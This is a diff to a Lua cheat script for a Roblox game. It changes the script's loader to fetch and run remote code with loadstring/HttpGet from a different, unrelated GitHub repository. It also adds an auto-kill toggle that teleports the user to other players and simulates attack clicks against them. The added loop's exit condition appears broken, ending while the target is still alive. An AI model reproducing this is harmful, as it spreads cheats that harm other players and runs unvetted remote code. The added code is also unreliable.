@@ -1,4 +1,4 @@
-local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/Hirimii/f4ckyou/main/cclua')))()
 local Mouse = game.Players.LocalPlayer:GetMouse()
 
 if game.PlaceId == 2753915549 then
@@ -3812,7 +3812,7 @@ MainTab:AddToggle({
     end)    
     
 MainTab:AddToggle({
-	Name = "Awakening Race V4",
+	Name = "Turn On Awakening Race V4",
 	Default = false,
 	Callback = function(Value)
 		AutoAwakeningRace = Value
@@ -5586,6 +5586,41 @@ V4Tab:AddButton({
   	end    
 }) 
 end
+
+V4Tab:AddToggle({
+	Name = "Kill Player When Trial Complete[Beta]",
+	Default = false,
+	Callback = function(Value)
+		KillPlayer = Value
+	end    
+}) 
+
+spawn(function()
+  	while wait() do 
+  		pcall(function()
+  			if KillPlayer then
+  					for i,v in pairs(game:GetService("Workspace").Characters:GetChildren()) do
+  						if v.Name ~= game.Players.LocalPlayer.Name then
+  						  if v:WaitForChild("Humanoid").Health > 0 and (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v.HumanoidRootPart.Position).Magnitude <= 2000 then
+  						    plyselecthunthelpold = v.Humanoid.Health
+  							repeat wait()
+  								if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude > 300 then
+  									topos(v.HumanoidRootPart.CFrame * CFrame.new(0,5,0))
+  								elseif (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 300 then
+  									AutoHaki()
+  									EquipWeapon(_G.SelectWeapon)
+  									topos(v.HumanoidRootPart.CFrame * CFrame.new(0,5,0))
+  									game:GetService'VirtualUser':CaptureController()
+  									game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
+  								end
+  							until not KillPlayer or v:WaitForChild("Humanoid").Health > 0
+  						end
+  					end
+  					end
+				end
+  			end)
+  	end
+  end)
 
 local RaidTab = Window:MakeTab({
 	Name = "Raid",
